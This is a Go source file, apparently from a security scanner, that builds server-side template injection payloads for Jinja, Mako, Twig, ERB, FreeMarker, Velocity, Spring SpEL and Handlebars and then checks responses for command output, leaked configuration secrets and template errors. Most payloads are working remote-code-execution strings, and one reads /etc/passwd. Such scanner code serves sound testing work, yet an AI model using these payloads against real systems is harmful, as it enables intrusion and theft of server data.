package sstibypass

import (
	"regexp"
	"strings"

	"github.com/akha-security/akca/engine/internal/payloadgen"
)

// EsotericPayloads returns sandbox-bypass SSTI probes tailored to detected stack hints.
func EsotericPayloads(tech payloadgen.TechHints) []payloadgen.Payload {
	fw := strings.ToLower(tech.Framework)
	lang := strings.ToLower(tech.BackendLanguage)
	var out []payloadgen.Payload
	add := func(variant, value, signal string) {
		out = append(out, payloadgen.Payload{
			Value: value, VulnClass: "ssti", Variant: variant, Family: "ssti",
			ExpectedSignal: signal,
		})
	}

	switch {
	case strings.Contains(fw, "django") || strings.Contains(fw, "jinja") || strings.Contains(fw, "flask") || strings.Contains(lang, "python"):
		add("jinja_mro", `{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read()}}`, "ssti_jinja_mro_bypass")
		add("jinja_config_rce", `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`, "ssti_jinja_config_rce")
		add("mako_util", `${self.module.cache.util.os.popen('id').read()}`, "ssti_mako_util")
	case strings.Contains(fw, "twig") || strings.Contains(fw, "symfony") || strings.Contains(lang, "php"):
		add("twig_filter_rce", `{{['id']|filter('system')}}`, "ssti_twig_filter_rce")
		add("twig_map_rce", `{{['cat /etc/passwd']|map('system')|join}}`, "ssti_twig_map_rce")
		add("twig_register", `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`, "ssti_twig_register_filter")
	case strings.Contains(fw, "rails") || strings.Contains(lang, "ruby"):
		add("erb_system", `<%= system('id') %>`, "ssti_erb_system")
		add("liquid_escape", `{% assign x = 'id' %}{{ x | system }}`, "ssti_liquid_system")
	case strings.Contains(fw, "freemarker"):
		add("freemarker_exec", `<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }`, "ssti_freemarker_execute")
	case strings.Contains(fw, "velocity"):
		add("velocity_runtime", `#set($rt=$class.inspect("java.lang.Runtime").type.getRuntime())$rt.exec("id")`, "ssti_velocity_runtime")
	case strings.Contains(fw, "spring") || strings.Contains(fw, "spel") || strings.Contains(lang, "java"):
		add("spring_spel_math", `*{T(java.lang.Math).multiplyExact(11,13)}`, "ssti_spel_math")
		add("spring_spel_runtime", `${T(java.lang.Runtime).getRuntime().exec("id")}`, "ssti_spel_runtime")
		add("pebble_set", `{% set x = 11*13 %}{{x}}`, "ssti_pebble_eval")
	case strings.Contains(fw, "smarty"):
		add("smarty_php", `{php}echo 11*13;{/php}`, "ssti_smarty_php")
		add("smarty_tag", `{if 11*13==143}AKCA_SSTI_CONFIRMED{/if}`, "ssti_smarty_tag")
	case strings.Contains(fw, "pug") || strings.Contains(fw, "jade") || strings.Contains(fw, "express") || strings.Contains(lang, "javascript") || strings.Contains(lang, "node"):
		add("pug_interpolation", `#{11*13}`, "ssti_pug_eval")
		add("ejs_scriptlet", `<%= 11*13 %>`, "ssti_ejs_eval")
	case strings.Contains(fw, "handlebars") || strings.Contains(fw, "mustache"):
		add("handlebars_lookup", `{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.sub.bind conslist}}{{this.pop}}{{this.pop (lookup string.sub "constructor")}}{{this.pop}}{{this.pop (lookup string.sub "apply")}}{{this.pop (lookup string.sub "call")}}{{/with}}{{/with}}{{/with}}{{/with}}`, "ssti_handlebars_proto")
	default:
		// Do not spray RCE/string-multiply probes without a template-engine
		// fingerprint. Low-risk arithmetic probes in modules/ssti.go establish
		// whether this is a plausible template surface first.
	}
	return out
}

var (
	mathProductRe = regexp.MustCompile(`\b(\d{2,5})\b`)
	cmdOutputRe   = regexp.MustCompile(`(?i)(uid=\d+|gid=\d+|root:|/bin/bash|www-data|nt authority)`)
)

// Analyze detects esoteric SSTI success beyond simple math evaluation.
func Analyze(payload payloadgen.Payload, body, baseline string) string {
	lower := strings.ToLower(body)
	if body == baseline {
		return ""
	}

	switch payload.ExpectedSignal {
	case "ssti_jinja_config", "ssti_jinja_config_rce":
		for _, kw := range []string{"secret_key", "sqlalchemy", "config", "database_uri", "aws_secret"} {
			if strings.Contains(lower, kw) && !strings.Contains(strings.ToLower(baseline), kw) {
				return "config_leak"
			}
		}
	}

	if cmdOutputRe.MatchString(body) && !cmdOutputRe.MatchString(baseline) {
		return "command_output"
	}

	for _, kw := range []string{
		"template syntax error", "jinja2.exceptions", "twig\\error", "freemarker.core",
		"undefined filter", "registerundefinedfilter", "org.springframework.expression",
		"pebble.error", "smarty error", "smarty: [eval]", "pug: error",
	} {
		if strings.Contains(lower, kw) && !strings.Contains(strings.ToLower(baseline), kw) {
			return "error_trace"
		}
	}

	// Smarty / custom canary confirmation
	if strings.Contains(body, "AKCA_SSTI_CONFIRMED") && !strings.Contains(baseline, "AKCA_SSTI_CONFIRMED") {
		return "template_evaluation"
	}

	// Arithmetic evaluation (e.g. 11*13 => 143)
	if (strings.Contains(payload.Value, "11*13") || strings.Contains(payload.Value, "11 * 13")) &&
		strings.Contains(body, "143") && !strings.Contains(baseline, "143") && !strings.Contains(body, payload.Value) {
		return "math_evaluation"
	}

	// Jinja string multiply {{7*'7'}} => 7777777
	if strings.Contains(payload.Value, "*'7'") && strings.Count(body, "7") >= 6 && strings.Count(baseline, "7") < 4 {
		if !strings.Contains(body, payload.Value) {
			return "string_multiply_eval"
		}
	}

	return ""
}
